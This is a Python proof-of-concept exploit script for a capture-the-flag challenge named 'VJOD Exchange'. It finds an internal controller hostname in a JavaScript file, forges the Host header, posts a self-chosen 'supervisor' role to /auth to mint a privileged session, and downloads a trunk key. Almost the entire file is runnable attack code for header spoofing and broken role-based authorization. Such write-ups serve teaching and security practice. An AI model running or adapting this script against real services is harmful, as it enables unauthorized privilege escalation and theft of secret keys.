#!/usr/bin/env python3
"""VJOD Exchange - proof of concept.

Summary: the controller routes on an untrusted Host header and /auth
accepts a caller-supplied role, so anyone can mint a supervisor session
and export the trunk key.

Usage: vjod_exchange.py [BASE_URL]

The CTF instance is retired; this PoC documents the exploit path.
Only requests to the challenge instance are made.
"""

import re
import sys

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://<instance>"
DEFAULT_CONTROLLER = "exch-ctl.vjod.internal"  # decoded in /static/switchboard.js
USERNAME = "EX-01"
ROLE = "supervisor"


def discover_controller(session):
    """Recon: the status page's switchboard.js decodes the controller hostname."""
    try:
        resp = session.get(f"{BASE}/static/switchboard.js", timeout=10)
        resp.raise_for_status()
    except requests.RequestException as exc:
        print(f"[recon] switchboard.js unavailable ({exc}); using {DEFAULT_CONTROLLER}")
        return DEFAULT_CONTROLLER
    match = re.search(r"[A-Za-z0-9._-]+\.internal", resp.text)
    host = match.group(0) if match else DEFAULT_CONTROLLER
    print(f"[recon] controller host: {host}")
    return host


def main():
    session = requests.Session()
    host = discover_controller(session)
    headers = {"Host": host}

    # /auth accepts a caller-supplied role without checking operator records.
    resp = session.post(f"{BASE}/auth", headers=headers,
                        json={"username": USERNAME, "role": ROLE}, timeout=10)
    resp.raise_for_status()
    cookie = session.cookies.get("ctl_sid")
    print(f"[auth] status={resp.status_code} ctl_sid={'<set>' if cookie else '<missing>'}")

    # The export trusts the (forged) supervisor session.
    resp = session.get(f"{BASE}/export/trunk-key", headers=headers, timeout=10)
    resp.raise_for_status()
    print(f"[export] {resp.text}")


if __name__ == "__main__":
    main()
